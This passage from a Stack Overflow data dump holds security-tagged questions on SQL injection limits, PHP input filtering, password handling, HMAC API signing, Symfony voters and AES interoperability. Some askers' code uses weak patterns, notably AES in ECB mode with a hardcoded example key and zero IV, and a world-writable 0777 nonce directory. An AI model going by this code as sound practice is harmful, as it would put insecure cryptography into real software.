</p>\n\n<pre><code>SELECT lastname, firstname FROM contacts WHERE lastname = (SELECT name FROM companies);\n</code></pre>\n\n<p>I am currently testing a web application, and I found a SQL Injection flaw where I can change <code>Doe</code> to whatever I want, but I'm limited with only one query (<a href=\"http://php.net/mysql_query\" rel=\"nofollow\">mysql_query restriction of PHP</a>) and <code>addslashes</code> (so no \" and ').</p>\n"},{"tags":["php","security","filter-input"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2304,"score":3,"question_id":298535,"title":"PHP's new input_filter does not read $_GET or $_POST arrays","body":"<p>In PHP 5.2 there was a nice security function added called \"input_filter\", so instead of saying:</p>\n\n<pre><code>$name = $_GET['name'];\n</code></pre>\n\n<p>you can now say:</p>\n\n<pre><code>$name = filter_input (INPUT_GET, 'name', FILTER_SANITIZE_STRING);\n</code></pre>\n\n<p>and it automatically sanitizes your string, there is also:</p>\n\n<ul>\n<li><code>FILTER_SANITIZE_ENCODED</code></li>\n<li><code>FILTER_SANITIZE_NUMBER_INT</code></li>\n<li><code>FILTER_SANITIZE_EMAIL</code></li>\n<li><code>FILTER_SANITIZE_URL</code></li>\n</ul>\n\n<p>etc. \nso this is a very convenient security feature to use and I want to switch over to it completely.</p>\n\n<p><b>The problem is...</b> I often manipulate the $_GET and $_POST arrays before processing them, like this:</p>\n\n<p>$_GET['name'] = '(default name)';</p>\n\n<p>but it seems that filter_input does not have access to the changes in $_GET since it reads \"INPUT_GET\" which is of type int (?). It would be nice if I could get filter_input to read $_GET instead but:</p>\n\n<pre><code>$name = filter_input ( $_GET, 'name', FILTER_SANITIZE_STRING );\n</code></pre>\n\n<p>gives me the error:</p>\n\n<pre><code>Warning: filter_input() expects parameter 1 to be long, array given.\n</code></pre>\n\n<p>Can anyone think of a way that I could:</p>\n\n<ul>\n<li>manipulate the source of <code>INPUT_GET</code> (whereever it is) so that I can change its values before filter_input can read them</li>\n<li>get filter_input to read <code>$_GET</code></li>\n</ul>\n\n<p><code>ADDENDUM:</code>\n<hr/></p>\n\n<p>Rich asked: \"Why are you changing the arrays anyway, surely you want them to be an input, rather than something you've programmatically inserted.\"</p>\n\n<p>It is just a very convenient place to preprocess variables coming in, e.g. in order to:</p>\n\n<ul>\n<li>set defaults (if $_GET['state'] = '' then $_GET['state'] = 'AL')</li>\n<li>do manual processing (delete all spaces, etc.)</li>\n<li>security (some of which will be done by filter_input now)</li>\n</ul>\n\n<p>Then I know by the time I get the incoming variable, it is secure and valid. Of course I could copy the $_GET array to another array and process THAT array but that is just an unnecessary step since I $_GET is already a functioning array so it makes sense to do it with these system arrays that already exist.</p>\n"},{"tags":["algorithm","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":389,"score":-1,"question_id":10987302,"title":"Scratch card number & serial generator","body":"<p>In a company, We need to make scratch cards similar to the ones available in the market.</p>\n\n<ul>\n<li>there is number hidden which needs to be scratched.</li>\n<li>Serial number which is visible.</li>\n</ul>\n\n<p>My question is very basic that how do other companies make those hidden and serial numbers. I have read little bit about hashing but couldn't connect the dots. </p>\n\n<ol>\n<li>Is the serial number independent of the invisible part?</li>\n<li>Do they take a serial number and hash that to make the invisible part or vice versa?</li>\n</ol>\n\n<p>and also,</p>\n\n<ol>\n<li>How are invisible numbers made? like what algorithm is commonly used for that?</li>\n</ol>\n\n<p>Any insight will be helpful. Thank you.</p>\n"},{"tags":["security","symfony2","symfony-2.1"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":13238072,"title":"There is no user provider for user \"Myapp\\MainBundle\\Document\\User\\User\"","body":"<p>I'm trying to authenticate with a custom user provider, and the default login form.</p>\n\n<p>The login part seems to work, because if I put an incorrect password it says 'bad credentials'. And if I put the correct password and catch the redirect, I can see my username in the toolbar.</p>\n\n<p>But after the redirect, I get <code>There is no user provider for user \"Myapp\\MainBundle\\Document\\User\\User\"</code></p>\n\n<p>My user provider is configured like this:</p>\n\n<pre><code># security.yml\nproviders:\n    database:\n        id: user_manager\nfirewalls:\n    dev:\n        pattern:  ^/(_(profiler|wdt)|css|images|js)/\n        security: false\n    main:\n        pattern: ^/\n        form_login:\n            login_path: /login\n            check_path: /login_check\n        logout:\n            path:   /logout\n            target: /\n        anonymous: true\n\n# config.yml\nservices:\n    user_manager:\n        class: Myapp\\MainBundle\\Service\\User\\UserManager\n        factory_service: doctrine_mongodb\n        factory_method:  getRepository\n        arguments: [ 'MyappMainBundle:User\\User' ]\n        calls:\n            - [ setEncoder, [ @security.encoder_factory ] ]\n</code></pre>\n\n<p>This is the user provider (the abstract class extends from DocumentRepository, and implements UserProviderInterface):</p>\n\n<pre><code>namespace Myapp\\MainBundle\\Service\\User;\n\nuse Myvendor\\UserBundle\\Service\\User\\AbstractUserManager;\nuse Myapp\\MainBundle\\Document\\User\\User;\n\nclass UserManager extends AbstractUserManager {\n    public function createUser() {\n        return new User;\n    }\n\n    public function supportsClass($class) {\n        return $class === 'Myapp\\MainBundle\\Document\\User\\User';\n    }\n}\n</code></pre>\n\n<p>How can this happen? Why does it find the provider for the login, but then fail on the next request?</p>\n\n<p>Symfony version: 2.1.3</p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>I debugged the code that comes right before that exception and found this was being catched (for the only provider I have): <code>\"Symfony\\Component\\Security\\Core\\Exception\\UnsupportedUserException\" \"Instances of \"Myapp\\MainBundle\\Document\\User\\User\" are not supported.</code>. How can this be possible? I even tried returning <code>true</code> in <code>supportsClass()</code></p>\n"},{"tags":["c#","winforms","security"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":13236940,"title":"Which passwordchar shows a black dot (•) in a winforms textbox using code?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/4051302/which-passwordchar-shows-a-black-dot-in-a-winforms-textbox\">Which passwordchar shows a black dot (•) in a winforms textbox?</a><br>\n  <a href=\"http://stackoverflow.com/questions/6796157/unicode-encoding-for-string-literals-in-c11\">Unicode encoding for string literals in C++11</a>  </p>\n</blockquote>\n\n\n\n<p>I want to use code to reveal the password or make it a dot like •</p>\n\n<pre><code>textBoxNewPassword.PasswordChar = (char)0149;\n</code></pre>\n\n<p>How can I achieve this?</p>\n"},{"tags":["flash","security","flash-cs3"],"answer_count":3,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":12517,"score":6,"question_id":2653669,"title":"Flash Security.AllowDomain()","body":"<p>I've got a Flash movie, loading data from an external URL. In fact, it's a RSS reader inside a banner.</p>\n\n<p>Everything works perfectly when the Flash movie and data URL are on the same domain. However, if the Flash movie is on another domain, Flash security kicks in.</p>\n\n<p>The manual says that I can allow a domain trough Security.AllowDomain()</p>\n\n<pre><code>system.Security.allowDomain(\"http://www.mydomain.abc/\")\nxmlData = new XML();\nxmlData.ignoreWhite = true;\nxmlData.onLoad = loadXML;\nxmlData.load(\"http://www.mydomain.abc/content.php\");\n</code></pre>\n\n<p>But when I embed the .swf in a HTML page, the data won't load. Any tips how to debug or solve this?</p>\n"},{"tags":["python","ruby","perl","security","penetration-testing"],"answer_count":13,"favorite_count":10,"up_vote_count":9,"down_vote_count":4,"view_count":2387,"score":5,"question_id":76408,"title":"Which of these scripting languages is more appropriate for pen-testing?","body":"<p>First of all, I want to avoid a flame-war on languages. The languages to choose from are Perl, Python and Ruby . I want to mention that I'm comfortable with all of them, but the problem is that I can't focus just on one. </p>\n\n<p>If, for example, I see a cool Perl module, I have to try it out. If I see a nice Python app, I have to know how it's made. If I see a Ruby DSL or some Ruby voodoo, I'm hooked on Ruby for a while.</p>\n\n<p>Right now I'm working as a Java developer, but plan on taking CEH in the near future. My question is: for tool writing and exploit development, which language do you find to be the most appropriate?</p>\n\n<p>Again, I don't want to cause a flame-war or any trouble, I just want honest opinions from scripters that know what they're doing.</p>\n\n<p>One more thing: maybe some of you will ask \"Why settle on one language?\". To answer this: I would like to choose only one language, in order to try to master it.</p>\n"},{"tags":["asp.net","security"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":43,"score":2,"question_id":13234304,"title":"Secure a single page in an ASP.NET app","body":"<p>I often have a need to secure a single page (i.e. Reports) on a public facing app so that only authorized users may access the page. In the past, this mean setting up a custom login form or using the ASP.NET membership provider or something else far too complex to serve the purpose. Is there an easier (safe) way to secure a single page in this fashion?</p>\n\n<p>Some things I've considered:</p>\n\n<ul>\n<li>Client certificates (initial setup is a pain)</li>\n<li>A single master password (works in a pinch, but feels dirty)</li>\n<li>Restrict access by host address (cumbersome when the need arises to allow external users access to the page). Also, need to support access via proxy (X-Forwarded-For) which can be faked by technical users)</li>\n</ul>\n\n<p>Are there other options? Recommendations?</p>\n"},{"tags":["java","security","web-applications","esapi"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3073,"score":1,"question_id":7696423,"title":"Trying to Use ESAPI But getting Error","body":"<p>I am trying to use ESAPI.jar for providing security to my web application.Basically I have just started using ESAPI.jar.\nBut problem is I am not able to run even a simple program using ESAPI.\nThe small code snippet is:-</p>\n\n<pre><code> String clean = ESAPI.encoder().canonicalize(\"someString\");\n    Randomizer r=ESAPI.randomizer();    \n    System.out.println(r);\n    System.out.println(clean);\n</code></pre>\n\n<p>I get this error:-</p>\n\n<pre><code>Attempting to load ESAPI.properties via file I/O.\nAttempting to load ESAPI.properties as resource file via file I/O.\nNot found in 'org.owasp.esapi.resources' directory or file not readable: D:\\Eclipse-Workspace\\Test\\ESAPI.properties\nNot found in SystemResource Directory/resourceDirectory: .esapi\\ESAPI.properties\nNot found in 'user.home' (C:\\Documents and Settings\\user.user) directory: C:\\Documents and Settings\\user.user\\esapi\\ESAPI.properties\nLoading ESAPI.properties via file I/O failed. Exception was: java.io.FileNotFoundException\nAttempting to load ESAPI.properties via the classpath.\nESAPI.properties could not be loaded by any means. Fail. Exception was: java.lang.IllegalArgumentException: Failed to load ESAPI.properties as a classloader resource.\nException in thread \"main\" org.owasp.esapi.errors.ConfigurationException: java.lang.reflect.InvocationTargetException SecurityConfiguration class (org.owasp.esapi.reference.DefaultSecurityConfiguration) CTOR threw exception.\n    at org.owasp.esapi.util.ObjFactory.make(ObjFactory.java:129)\n    at org.owasp.esapi.ESAPI.securityConfiguration(ESAPI.java:184)\n    at org.owasp.esapi.ESAPI.encoder(ESAPI.java:99)\n    at org.rancore.testJasp.TestEsapi.main(TestEsapi.java:59)\nCaused by: java.lang.reflect.InvocationTargetException\n    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)\n    at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)\n    at java.lang.reflect.Method.invoke(Unknown Source)\n    at org.owasp.esapi.util.ObjFactory.make(ObjFactory.java:86)\n    ... 3 more\nCaused by: org.owasp.esapi.errors.ConfigurationException: ESAPI.properties could not be loaded by any means. Fail.\n    at org.owasp.esapi.reference.DefaultSecurityConfiguration.loadConfiguration(DefaultSecurityConfiguration.java:439)\n    at org.owasp.esapi.reference.DefaultSecurityConfiguration.&lt;init&gt;(DefaultSecurityConfiguration.java:227)\n    at org.owasp.esapi.reference.DefaultSecurityConfiguration.getInstance(DefaultSecurityConfiguration.java:75)\n    ... 8 more\nCaused by: java.lang.IllegalArgumentException: Failed to load ESAPI.properties as a classloader resource.\n    at org.owasp.esapi.reference.DefaultSecurityConfiguration.loadConfigurationFromClasspath(DefaultSecurityConfiguration.java:667)\n    at org.owasp.esapi.reference.DefaultSecurityConfiguration.loadConfiguration(DefaultSecurityConfiguration.java:436)\n    ... 10 more\n</code></pre>\n\n<p>I have tried copying the 3 properties file of ESAPI  in source folder and also configuring them on build path but still I have not succeeded.I have tried many permutations and combinations but to no avail.</p>\n\n<p>Please guide me..</p>\n\n<p>The content of property file is </p>\n\n<pre><code># User Messages\nError.creating.randomizer=Error creating randomizer\n\nThis.is.test.message=This {0} is {1} a test {2} message\n\n# Validation Messages\n\n# Log Messages\n</code></pre>\n"},{"tags":["security","passwords"],"answer_count":6,"favorite_count":20,"up_vote_count":22,"down_vote_count":0,"view_count":5877,"score":22,"question_id":270485,"title":"Password Management Best Practices (soup to nuts, not just storage or generation)","body":"<p>We have a site with personal user information. I need to know best-practices for password management.</p>\n\n<ol>\n<li>These are average users - should I impose 'hard' passwords?</li>\n<li>Is there any disadvantage to using the user's email address as a userid?</li>\n<li>How should I handle forgotten password requests? Obviously, I can't email them to the user.</li>\n<li>How should the passwords be stored, encrypted? Should I encrypt the userids as well?</li>\n</ol>\n"},{"tags":["security","rsa","pgp","shared-secret"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12959134,"title":"Security protocol for server-side shared secret generation","body":"<p>I am trying to implement a security system that has the following requirements:</p>\n\n<ul>\n<li>All clients share a password, which is <strong>not</strong> known to the server</li>\n<li>Each client has a <strong>unique</strong> client-id, which <strong>is</strong> known to the server</li>\n<li>All clients with knowledge of the password must be able to generate the same shared secret on the server (this secret can be anything, it just needs to be the same for all clients and unique across passwords)</li>\n<li>The password needs to remain secure, even if the server or the transport get hacked</li>\n<li>It must be impossible for another party with a different client-id to generate the same server-side secret without knowledge of the password</li>\n</ul>\n\n<p>Let me try to give a graphical representation of this:</p>\n\n<pre><code>            Client                         Server\n.--------------^-----------.       .----------^----------.\n\n          f(client-id 1)              g(client-id 1)\nPASSWORD ----------------&gt; request 1 ----------------&gt; KEY\n   || equal                                             || equal\nPASSWORD ----------------&gt; request 2 ----------------&gt; KEY\n          f(client-id 2)              g(client-id 2)\n</code></pre>\n\n<p>Here, f() [g()] are functions that the client [server] applies to the password [request] to obtain the request [key]. These functions may depend on the client-id.</p>\n\n<p>There's two approaches that I have come up with that might do this, but I am hoping for something simpler that requires less traffic and less server load:</p>\n\n<ol>\n<li><p>\"No-brainer\": The clients hash the password. The clients and server each use a standard mechanism (like SSL) to secure their connection and send the hash over this connection.</p></li>\n<li><p>\"A little more clever\": The server has a fixed private-key coded into it and each client has the public-key coded into it. The clients hash the password, XOR it with their client-id, encrypt the result with RSA/PGP using the public key. The server then decrypts the request using the private key and XORs the result with the client-id to arrive at the password hash.</p></li>\n</ol>\n\n<p>In both cases, the server ends up with the same secret for the clients: the password hash. The advantage of the second version is that there is no need for the overhead of a full-fledged key exchange and encryption system, since unfortunately I won't be able to rely on SSL in all cases. In fact, it allows me to generate the server secret in a single request without any handshake. The client-id-XOR in the second version are used to prevent replay-attacks, where a third party with a different client-id could otherwise simply send the same encrypted message to the server to generate the same secret. Basically it's a no-overhead way to add a salt.</p>\n\n<p>Now the question:</p>\n\n<p>Since I don't really have any requirements on the server-side secret, not even that the clients can generate this secret locally, <strong>is there an even simpler way to do this</strong> that doesn't require expensive modular exponentiation of arbitrary-precision numbers like RSA does? I'm thinking of maybe some sort of other trapdoor function for f() and g() above that allows me to achieve the same result.</p>\n"},{"tags":["php","security","api","rest","hmac"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":53,"score":0,"question_id":13235898,"title":"How do I restrict access to an API signature generator in PHP?","body":"<p>When using an HMAC signature for authenticating REST API calls, how can I prevent someone from  creating their own useable signature by manually calling the script that generates the signature?</p>\n\n<p>For example, if an AJAX request is used to retrieve a signature that will be appended to a CORS Ajax request to the API, the possibility exists that someone can create their own signature by passing the appropriate values/headers.</p>\n\n<p>I know that I could use <code>$_SERVER['REMOTE_ADDR']</code> or <code>$_SERVER['REMOTE_HOST']</code> to add some layer of security, but these can be spoofed.</p>\n\n<p>Please assume that I'll be using SSL for all connections, and that I know about OAuth but will not be using it here.</p>\n"},{"tags":["php","security","postgresql"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":47,"score":2,"question_id":13235664,"title":"Is this PostgreSQL query vulnerable?","body":"<p>Using the <a href=\"http://www.php.net/manual/en/function.pg-escape-literal.php\" rel=\"nofollow\">pg_escape_literal</a> PHP function, I'm escaping my user input data as follows:</p>\n\n<pre><code>  &lt;?php\n  $dbconn = pg_connect('dbname=foo');\n  $escaped = pg_escape_literal($_GET['name']);\n  pg_query(\"INSERT INTO participants (name) VALUES ({$escaped})\");\n  ?&gt;\n</code></pre>\n\n<p>Being new to PostgreSQL, my questions are:</p>\n\n<ul>\n<li>Is there a way to achieve an SQL injection given this code?</li>\n<li>Is there any other vulnerability that is left untreated in this code?</li>\n</ul>\n\n<p>Using PHP 5.4 and PostgreSQL 9.2. </p>\n"},{"tags":["django","security"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":7714979,"title":"How to avoid sensitive information in POSTs from appearing in logs and debug emails?","body":"<p>One of my websites has a form for customers to submit their credit card information.</p>\n\n<p>Under normal operation the sensitive information (credit card number, expiration date, etc) is fairly secured due to the SSL of the connection and the fact that the data may not be saved on the backend after the charging attempt.</p>\n\n<p>The problem starts whenever an exception is raised by the backend code handling the request, since the exception details (which with Django include the POST QueryDict) contain the sensitive info in plain text. These in turn find their way into both the error logs and into emails which are sent to the admins.</p>\n\n<p>Is there some elegant way to avoid this?</p>\n"},{"tags":["security","authentication","grails","nimble"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":303,"score":1,"question_id":5762908,"title":"Grails request filters: what's the source of this mysterious authorization method?","body":"<p>I'm building a custom authentication filter class in Grails.  It's working, but it bugs me that I don't know <em>why</em> it's working.</p>\n\n<p>In the following Grails request filter, where/how is the \"role\" method defined?  It's got to be part of the Nimble plugin for Grails, but I don't see it in NimbleFilterBase, which my filter class extends.  </p>\n\n<pre><code>public class MySecurityFilters extends MyCustomExtensionOfNimbleFilterBase {\n    def filters = {\n        reports(controller: 'foo', action: 'bar') {\n            before = {\n                accessControl {\n                    role('Administrator')\n                }\n            }\n        }\n</code></pre>\n\n<p>Also, what exactly is the \"accessControl\" block?  Is that a built-in part of Grails, or something Nimble somehow provides, or just a random scoping mechanism that I could get rid of? </p>\n\n<p>Thanks!</p>\n"},{"tags":["php","security","symfony2","response"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":69,"score":2,"question_id":12749457,"title":"Voter causing 500 error rather than 403","body":"<p>I've created a custom voter that denies access to my API if the request doesn't contain a valid auth header. It's based on a combination of two cookbook entries: \n<a href=\"http://symfony.com/doc/current/cookbook/security/voters.html\" rel=\"nofollow\">http://symfony.com/doc/current/cookbook/security/voters.html</a> and <a href=\"http://symfony.com/doc/current/cookbook/security/custom_authentication_provider.html\" rel=\"nofollow\">http://symfony.com/doc/current/cookbook/security/custom_authentication_provider.html</a></p>\n\n<pre class=\"lang-php prettyprint-override\"><code>&lt;?php\n\nnamespace Acme\\RestBundle\\Security\\Authorization\\Voter;\n\nuse Symfony\\Component\\DependencyInjection\\ContainerInterface;\nuse Symfony\\Component\\Security\\Core\\Authorization\\Voter\\VoterInterface;\nuse Symfony\\Component\\Security\\Core\\Authentication\\Token\\TokenInterface;\nuse Symfony\\Component\\Security\\Core\\Exception\\AuthenticationException;\nuse Symfony\\Component\\Security\\Core\\Exception\\NonceExpiredException;\nuse Monolog\\Logger;\n\nclass ApiClientVoter implements VoterInterface\n{\n    protected $container;\n    protected $nonceCacheDir;\n\n    /**\n     * We inject the full service container due to scope issues when\n     * injecting the request.\n     *\n     * @param ContainerInterface $container\n     * @param string $nonceCacheDir\n     */\n    public function __construct(ContainerInterface $container, $nonceCacheDir)\n    {\n        $this-&gt;container     = $container;\n        $this-&gt;nonceCacheDir = $nonceCacheDir;\n    }\n\n    public function supportsAttribute($attribute)\n    {\n        // we won't check against a user attribute, so we return true\n        return true;\n    }\n\n    public function supportsClass($class)\n    {\n        // our voter supports all type of token classes, so we return true\n        return true;\n    }\n\n    public function vote(TokenInterface $token, $object, array $attributes)\n    {\n        if ($this-&gt;authenticate()) {\n            return VoterInterface::ACCESS_ABSTAIN;\n        }\n\n        return VoterInterface::ACCESS_DENIED;\n    }\n\n\n    /**\n     * Checks for an authentication header in the request and confirms\n     * the client is valid.\n     *\n     * @return bool\n     */\n    protected function authenticate()\n    {\n        $request = $this-&gt;container-&gt;get('request');\n\n        if ($request-&gt;headers-&gt;has('x-acme-auth')) {\n\n            $authRegex = '/ApiKey=\"([^\"]+)\", ApiDigest=\"([^\"]+)\", Nonce=\"([^\"]+)\", Created=\"([^\"]+)\"/';\n\n            if (preg_match($authRegex, $request-&gt;headers-&gt;get('x-acme-auth'), $matches)) {\n                $apiClient = $this-&gt;container-&gt;get('in_memory_user_provider')-&gt;loadUserByUsername($matches[1]);\n\n                if ($apiClient &amp;&amp; $this-&gt;validateDigest($matches[2], $matches[3], $matches[4], $apiClient-&gt;getPassword())) {\n                    return true;\n                }\n            }\n        } else {\n            $this-&gt;container-&gt;get('logger')-&gt;err('no x-acme-auth header present in request');\n        }\n\n        return false;\n    }\n\n    /**\n     * Performs checks to prevent replay attacks and to validate\n     * digest against a known client.\n     *\n     * @param string $digest\n     * @param string $nonce\n     * @param string $created\n     * @param string $secret\n     * @return bool\n     * @throws AuthenticationException\n     * @throws NonceExpiredException\n     */\n    protected function validateDigest($digest, $nonce, $created, $secret)\n    {\n        // Expire timestamp after 5 minutes\n        if (time() - strtotime($created) &gt; 300) {\n            $this-&gt;container-&gt;get('logger')-&gt;err('Timestamp expired');\n\n            return false;\n        }\n\n        if (!is_dir($this-&gt;nonceCacheDir)) {\n            mkdir($this-&gt;nonceCacheDir, 0777, true);\n        }\n\n        // Validate nonce is unique within 5 minutes\n        if (file_exists($this-&gt;nonceCacheDir.'/'.$nonce) &amp;&amp; file_get_contents($this-&gt;nonceCacheDir.'/'.$nonce) + 300 &gt; time()) {\n            $this-&gt;container-&gt;get('logger')-&gt;err('Previously used nonce detected');\n\n            return false;\n        }\n\n        file_put_contents($this-&gt;nonceCacheDir.'/'.$nonce, time());\n\n        // Validate Secret\n        $expected = base64_encode(sha1(base64_decode($nonce).$created.$secret, true));\n\n        return $digest === $expected;\n    }\n}\n</code></pre>\n\n<p>The problem I'm having is that when my voter returns ACCESS_DENIED, I get a 500 error when the firewall redirects to the authentication entry point:</p>\n\n<pre><code>[2012-10-05 11:09:16] app.ERROR: no x-acme-auth header present in request [] []\n[2012-10-05 11:09:16] event.DEBUG: Notified event \"kernel.exception\" to listener \"Symfony\\Component\\Security\\Http\\Firewall\\ExceptionListener::onKernelException\". [] []\n[2012-10-05 11:09:16] security.DEBUG: Access is denied (user is not fully authenticated) by \"/home/phil/projects/acme/vendor/symfony/symfony/src/Symfony/Component/Security/Http/Firewall/AccessListener.php\" at line 70; redirecting to authentication entry point [] []\n[2012-10-05 11:09:16] event.DEBUG: Notified event \"kernel.exception\" to listener \"Symfony\\Component\\HttpKernel\\EventListener\\ProfilerListener::onKernelException\". [] []\n[2012-10-05 11:09:16] event.DEBUG: Notified event \"kernel.exception\" to listener \"Symfony\\Component\\HttpKernel\\EventListener\\ExceptionListener::onKernelException\". [] []\n[2012-10-05 11:09:16] request.CRITICAL: Symfony\\Component\\Security\\Core\\Exception\\InsufficientAuthenticationException: Full authentication is required to access this resource. (uncaught exception) at /home/phil/projects/acme/vendor/symfony/symfony/src/Symfony/Component/Security/Http/Firewall/ExceptionListener.php line 109\n</code></pre>\n\n<p>What I actually want to happen is just to return a 403 response. Is it possible to do this?</p>\n"},{"tags":["java","iphone","objective-c","security","jce"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":892,"score":0,"question_id":6575450,"title":"Encrypting data with Objective-C and decrypt it with Java Problem","body":"<p>I have an iPhone solutions that uses XML to transmit data between the client (mobile) and the server (Java). Some of the parts of the message (XML) must be encrypted because of the type of information transmitted. I planned to use AES 128 to encrypt and decrypt the data between these two endpoints. </p>\n\n<p>First the sensitive data is encrypted using Object-C's CommonCrypto framework, and then the data is decrypted inside a Java Server (Servlet).</p>\n\n<p>I'm new to security protocols and standards, and basically my code is a subset of group of informations that I could gather on Apple's dev forum/resources, and the internet (Google) :-)</p>\n\n<p>The basic flow is:</p>\n\n<ol>\n<li>The data is encrypted using AES (using a pre-set key).</li>\n<li>The encrypted bytes are putted within the XML (using base64)</li>\n<li>The data is gathered from the XML, and decrypted using the same pre-setted key;</li>\n</ol>\n\n<p>The encryption part of the Object-C code is:</p>\n\n<pre><code>char keyPtr [ kCCKeySizeAES128 +1 ];\nbzero( keyPtr, sizeof(keyPtr) );\n\n// The secret key is masked for obvious reason, but you can use \"12345678912345678912345678912345\"\n[key getCString:keyPtr maxLength:sizeof(keyPtr) encoding:NSUTF8StringEncoding];\n\nNSUInteger dataLength = [data length];\n// Initialization vector; dummy in this case 0's.\nuint8_t iv[ kCCBlockSizeAES128 ];\nmemset((void *) iv, 0x0, (size_t) sizeof(iv));\n/*\n For block ciphers, the output size will always be less than or\n equal to the input size plus the size of one block.\n*/\nsize_t bufferSize = (dataLength + kCCBlockSizeAES128);\nvoid  *buffer     = malloc(bufferSize);\nmemset(buffer, 0x0, bufferSize);\n\nsize_t numBytesEncrypted    = 0;\nCCCryptorStatus cryptStatus = CCCrypt(kCCEncrypt, kCCAlgorithmAES128, \n                                      kCCOptionECBMode + kCCOptionPKCS7Padding,\n                                      keyPtr, kCCKeySizeAES128,\n                                      iv, [data bytes], dataLength, /* input */\n                                      buffer, bufferSize, /* output */\n                                      &amp;numBytesEncrypted);\n\nif (cryptStatus == kCCSuccess) {\n    return [NSData dataWithBytesNoCopy:buffer length:numBytesEncrypted];\n}\n\nfree(buffer); //free the buffer;\nreturn nil;\n</code></pre>\n\n<p>The Java code part is:</p>\n\n<pre><code>Security.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider());\nbyte[] keyBytes = DES_KEY.getBytes(); //&lt;== The same as above\n\nSecretKeySpec keySpec = new SecretKeySpec(keyBytes, \"AES\");\n\ntry {\n    // Return the raw bytes \n    byte []data = Base64.decode(encryptedContent);\n\n    // Gets the Cipher...\n    final Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS7Padding\", \"BC\");\n    cipher.init(Cipher.DECRYPT_MODE, keySpec);\n\n    String resultString = new String(cipher.doFinal(data));\n} catch (Exception ex) {\n    ...\n}\n</code></pre>\n\n<p>The error I get when running these solution above in the Java Server is:</p>\n\n<pre><code>15:57:43,671 ERROR [STDERR] com.iteatros.aim.services.ServiceException: javax.crypto.BadPaddingException: pad block corrupted\n15:57:43,674 ERROR [STDERR]     at com.iteatros.aim.services.security.SecurityWrapper.decrypt3DESBase64StringData(SecurityWrapper.java:109)\n15:57:43,674 ERROR [STDERR]     at com.iteatros.aim.services.db.LoginDAO.login(LoginDAO.java:53)\n15:57:43,674 ERROR [STDERR]     at com.iteatros.aim.services.AbstractService.authenticate(AbstractService.java:278)\n15:57:43,674 ERROR [STDERR]     at com.iteatros.aim.services.AbstractService.doPost(AbstractService.java:165)\n15:57:43,674 ERROR [STDERR]     at javax.servlet.http.HttpServlet.service(HttpServlet.java:637)\n15:57:43,674 ERROR [STDERR]     at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)\n15:57:43,674 ERROR [STDERR]     at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)\n15:57:43,675 ERROR [STDERR]     at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)\n15:57:43,675 ERROR [STDERR]     at org.jboss.web.tomcat.filters.ReplyHeaderFilter.doFilter(ReplyHeaderFilter.java:96)\n15:57:43,675 ERROR [STDERR]     at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)\n15:57:43,676 ERROR [STDERR]     at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)\n15:57:43,676 ERROR [STDERR]     at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:235)\n15:57:43,676 ERROR [STDERR]     at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:191)\n15:57:43,676 ERROR [STDERR]     at org.jboss.web.tomcat.security.SecurityAssociationValve.invoke(SecurityAssociationValve.java:190)\n15:57:43,676 ERROR [STDERR]     at org.jboss.web.tomcat.security.JaccContextValve.invoke(JaccContextValve.java:92)\n15:57:43,676 ERROR [STDERR]     at org.jboss.web.tomcat.security.SecurityContextEstablishmentValve.process(SecurityContextEstablishmentValve.java:126)\n15:57:43,676 ERROR [STDERR]     at org.jboss.web.tomcat.security.SecurityContextEstablishmentValve.invoke(SecurityContextEstablishmentValve.java:70)\n15:57:43,677 ERROR [STDERR]     at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127)\n15:57:43,677 ERROR [STDERR]     at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102)\n15:57:43,677 ERROR [STDERR]     at org.jboss.web.tomcat.service.jca.CachedConnectionValve.invoke(CachedConnectionValve.java:158)\n15:57:43,677 ERROR [STDERR]     at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109)\n15:57:43,677 ERROR [STDERR]     at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:330)\n15:57:43,677 ERROR [STDERR]     at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:829)\n15:57:43,677 ERROR [STDERR]     at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:601)\n15:57:43,677 ERROR [STDERR]     at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:447)\n15:57:43,677 ERROR [STDERR]     at 